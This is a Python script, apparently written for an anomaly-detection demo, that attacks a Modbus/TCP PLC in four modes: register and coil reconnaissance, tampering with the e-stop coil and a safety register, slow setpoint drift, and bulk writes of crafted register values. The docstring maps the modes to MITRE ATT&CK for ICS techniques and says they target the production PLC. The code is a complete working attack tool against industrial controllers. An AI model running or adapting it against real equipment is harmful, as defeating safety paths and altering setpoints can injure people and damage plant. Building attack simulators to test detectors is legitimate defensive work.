#!/usr/bin/env python3
"""
Extra ICS attack simulators (one script, four modes) — expands the attack library
for the demo. Each is a deliberate test artefact; do not run against equipment that
moves people or damages property. All target the production PLC over Modbus/TCP.

Modes (with MITRE ATT&CK for ICS technique):
  recon  — Remote System Discovery (T0846/T0888): rapid FC3 sweep across the whole
           holding-register map + coil probe. Anomalous breadth + volume vs the
           narrow, steady HMI baseline.
  estop  — Loss of Safety / Change Operating Mode (T0880/T0858): writes to the
           safety/e-stop registers + coils. The baseline NEVER writes, so any write
           is anomalous; writing the safety path is the worst case.
  drift  — Modify Parameter (T0836): slow, small writes to a setpoint register — the
           "low and slow" stealthy attack. Still flagged because the baseline is
           read-only (write_ratio jumps off zero).
  bulk   — Unauthorized Program / Modify Controller Tasking (T0843/T0821): FC16
           multi-register writes pushing a block of crafted values at once.

Run:
    python3 attack_modbus_extra.py --host 192.168.10.10 --mode recon --duration-s 18
"""
from __future__ import annotations

import argparse
import logging
import random
import signal
import sys
import time

try:
    from pymodbus.client import ModbusTcpClient
except ImportError as exc:  # pragma: no cover
    print(f"pymodbus not installed: {exc}", file=sys.stderr)
    sys.exit(2)

LOG = logging.getLogger("attack_modbus_extra")
_EXIT = False


def _sigterm(*_a):
    global _EXIT  # noqa: PLW0603
    _EXIT = True


def main(argv) -> int:
    p = argparse.ArgumentParser(description=__doc__.split("\n")[1])
    p.add_argument("--host", required=True)
    p.add_argument("--port", type=int, default=502)
    p.add_argument("--unit-id", type=int, default=1)
    p.add_argument("--mode", required=True, choices=["recon", "estop", "drift", "bulk"])
    p.add_argument("--duration-s", type=float, default=18.0)
    p.add_argument("--rate-hz", type=float, default=8.0)
    p.add_argument("--log-level", default="INFO")
    a = p.parse_args(argv)
    logging.basicConfig(level=getattr(logging, a.log_level),
                        format="%(asctime)s %(name)s %(levelname)s %(message)s")
    signal.signal(signal.SIGINT, _sigterm)
    signal.signal(signal.SIGTERM, _sigterm)
    rng = random.Random(7)

    LOG.warning("STARTING %s ATTACK: target=%s rate=%.1fHz dur=%.0fs",
                a.mode.upper(), a.host, a.rate_hz, a.duration_s)
    client = ModbusTcpClient(host=a.host, port=a.port, timeout=2.0)
    if not client.connect():
        LOG.error("cannot connect to %s:%d", a.host, a.port)
        return 1

    period = 1.0 / a.rate_hz
    started = time.monotonic()
    ok = err = 0
    sweep = 0
    try:
        while not _EXIT and (time.monotonic() - started) < a.duration_s:
            t0 = time.monotonic()
            try:
                if a.mode == "recon":
                    # walk the whole map in 8-register chunks + probe coils
                    addr = (sweep * 8) % 64
                    sweep += 1
                    rr = client.read_holding_registers(address=addr, count=8, slave=a.unit_id)
                    client.read_coils(address=addr, count=8, slave=a.unit_id)
                elif a.mode == "estop":
                    # tamper the safety path: clear/trip e-stop + write the safety reg
                    client.write_coil(address=1, value=rng.choice([True, False]), slave=a.unit_id)
                    rr = client.write_register(address=2, value=rng.choice([0, 9]), slave=a.unit_id)
                elif a.mode == "drift":
                    # low-and-slow: nudge a setpoint register by a small step
                    rr = client.write_register(address=4, value=(int(time.monotonic()) % 50), slave=a.unit_id)
                else:  # bulk
                    vals = [rng.randint(1000, 9999) for _ in range(8)]
                    rr = client.write_registers(address=8, values=vals, slave=a.unit_id)
                err += int(bool(rr and rr.isError()))
                ok += int(not (rr and rr.isError()))
            except Exception as exc:  # noqa: BLE001
                err += 1
                LOG.warning("exception: %s", exc)
            sleep = period - (time.monotonic() - t0)
            if sleep > 0:
                time.sleep(sleep)
    finally:
        try:
            client.close()
        except Exception:  # noqa: BLE001
            pass
    LOG.warning("%s DONE: ok=%d err=%d elapsed=%.1fs", a.mode.upper(), ok, err,
                time.monotonic() - started)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
